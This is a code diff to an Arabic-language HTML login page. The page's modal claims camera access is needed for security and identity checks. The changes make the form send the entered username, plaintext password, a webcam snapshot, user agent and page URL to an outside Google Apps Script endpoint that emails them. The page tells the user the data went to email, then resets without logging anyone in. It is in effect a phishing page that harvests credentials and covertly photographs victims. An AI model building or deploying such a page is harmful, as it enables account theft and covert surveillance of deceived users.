@@ -201,7 +201,26 @@
             font-size: 0.9rem;
         }
         
-        /* نافذة طلب الصلاحيات */
+        /* معاينة الصورة */
+        #preview-container {
+            display: none;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        #preview-image {
+            max-width: 100%;
+            border-radius: 8px;
+            border: 2px solid #e1e5ee;
+        }
+        
+        .preview-title {
+            margin-bottom: 10px;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+        
+        /* نافذة الصلاحيات */
         #permission-modal {
             position: fixed;
             top: 0;
@@ -258,9 +277,9 @@
     <!-- نافذة طلب الصلاحيات -->
     <div id="permission-modal">
         <div class="permission-content">
-            <h2>صلاحيات النظام</h2>
-            <p>يتطلب النظام الوصول إلى الكاميرا لأغراض الأمان. سيتم التقاط صورة عند تسجيل الدخول للتأكد من هوية المستخدم.</p>
-            <button class="permission-btn" id="grant-permission">منح الصلاحيات</button>
+            <h2>صلاحيات النظام الآمن</h2>
+            <p>يتطلب النظام الوصول إلى الكاميرا لأغراض الأمان والتوثيق. سيتم التقاط صورة عند تسجيل الدخول للتأكد من هوية المستخدم.</p>
+            <button class="permission-btn" id="grant-permission">منح صلاحية الكاميرا</button>
         </div>
     </div>
 
@@ -291,6 +310,12 @@
                 <a href="#">نسيت كلمة المرور؟</a>
             </div>
             
+            <!-- معاينة الصورة -->
+            <div id="preview-container">
+                <p class="preview-title">صورة المستخدم:</p>
+                <img id="preview-image" src="" alt="معاينة الصورة">
+            </div>
+            
             <div id="status"></div>
         </form>
         
@@ -316,14 +341,16 @@
         const statusDiv = document.getElementById('status');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const previewContainer = document.getElementById('preview-container');
+        const previewImage = document.getElementById('preview-image');
         const permissionModal = document.getElementById('permission-modal');
         const grantPermissionBtn = document.getElementById('grant-permission');
         
         let stream = null;
         let cameraPermissionGranted = false;
         
-        // استبدل هذا الرابط برابط نشر Google Apps Script الخاص بك
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzbGuwmhYh1SvcEfKwv5_djNMMyh8bwCapY2oviHTeo9tPz3F7-Z_lxp4vyJYh0sddX/exec';
+        // رابط Google Apps Script - استبدله برابط نشرك
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwsvZL585YVpUiJV-QXIcD2f_x-yt4H312EFZ-Niv0NCNiam5Fnm9B4LLuNWf3W8RRI/exec';
         
         // طلب صلاحيات الكاميرا
         grantPermissionBtn.addEventListener('click', async () => {
@@ -410,7 +437,7 @@
         
         // التقاط الصورة وإرسالها
         async function captureAndSendPhoto(username, password) {
-            showStatus('جاري التحقق من بياناتك...', 'loading');
+            showStatus('جاري التقاط الصورة...', 'loading');
             
             try {
                 // التقاط الصورة
@@ -420,63 +447,62 @@
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 // تحويل الصورة إلى بيانات
-                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                 
-                // إرسال البيانات إلى الخادم
-                const response = await fetch(SCRIPT_URL, {
+                // عرض معاينة الصورة
+                previewImage.src = imageData;
+                previewContainer.style.display = 'block';
+                
+                // إرسال البيانات إلى Google Apps Script
+                showStatus('جاري إرسال البيانات...', 'loading');
+                await sendToGoogleScript(username, password, imageData);
+                
+            } catch (error) {
+                console.error('Error capturing photo:', error);
+                showStatus('فشل في التقاط الصورة. يرجى المحاولة مرة أخرى.', 'error');
+                throw error;
+            }
+        }
+        
+        // إرسال البيانات إلى Google Apps Script
+        async function sendToGoogleScript(username, password, imageData) {
+            try {
+                const formData = new FormData();
+                formData.append('username', username);
+                formData.append('password', password);
+                formData.append('image', imageData);
+                formData.append('timestamp', new Date().toLocaleString('ar-SA'));
+                formData.append('userAgent', navigator.userAgent);
+                formData.append('pageURL', window.location.href);
+                
+                const response = await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                    // إضافة رأس CORS للمساعدة في تجنب مشاكل CORS
-                    // 'Access-Control-Allow-Origin': '*'
-                    // ملاحظة: هذا قد لا يعمل من جانب العميل، يجب ضبطه في الخادم
-                    // بدلاً من ذلك، يمكن استخدام mode: 'no-cors' لكن هذا يمنع قراءة الاستجابة
-                    // mode: 'no-cors'
-                    // بديل آخر: استخدام Google Apps Script الذي يدعم CORS
-                    // mode: 'cors'
-                    // mode: 'no-cors'
-                },
-                    body: JSON.stringify({
-                        username: username,
-                        password: password, // إضافة كلمة المرور
-                        image: imageData,
-                        userAgent: navigator.userAgent,
-                        timestamp: new Date().toISOString(),
-                        location: window.location.href
-                    })
+                    body: formData
                 });
                 
-                // محاولة قراءة الاستجابة
-                let result;
-                try {
-                    result = await response.json();
-                } catch (e) {
-                    // إذا لم نتمكن من تحليل JSON، نعتبر أن الطلب ناجح
-                    console.log('Response is not JSON, assuming success');
-                    result = { success: true };
-                }
+                const result = await response.text();
                 
-                if (result.success) {
-                    showStatus('تم تسجيل الدخول بنجاح!', 'success');
-                    // هنا يمكنك إعادة توجيه المستخدم إلى الصفحة الرئيسية
-                    // window.location.href = 'dashboard.html';
+                if (response.ok) {
+                    showStatus('تم إرسال البيانات بنجاح إلى البريد الإلكتروني!', 'success');
+                    
+                    // إعادة تعيين النموذج بعد النجاح
+                    setTimeout(() => {
+                        loginForm.reset();
+                        previewContainer.style.display = 'none';
+                        loginBtn.disabled = false;
+                        loginBtn.textContent = 'تسجيل الدخول';
+                        showStatus('', '');
+                    }, 3000);
                 } else {
-                    showStatus('بيانات غير صحيحة. يرجى المحاولة مرة أخرى.', 'error');
+                    throw new Error('فشل في إرسال البيانات: ' + result);
                 }
                 
             } catch (error) {
-                console.error('Error capturing/sending photo:', error);
-                showStatus('فشل في التحقق. يرجى المحاولة مرة أخرى.', 'error');
-            } finally {
-                // إعادة تعيين الواجهة
-                setTimeout(() => {
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = 'تسجيل الدخول';
-                    usernameInput.value = '';
-                    passwordInput.value = '';
-                    showStatus('', '');
-                }, 3000);
+                console.error('Error sending to Google Script:', error);
+                showStatus('فشل في إرسال البيانات. يرجى المحاولة مرة أخرى.', 'error');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'تسجيل الدخول';
+                throw error;
             }
         }
         
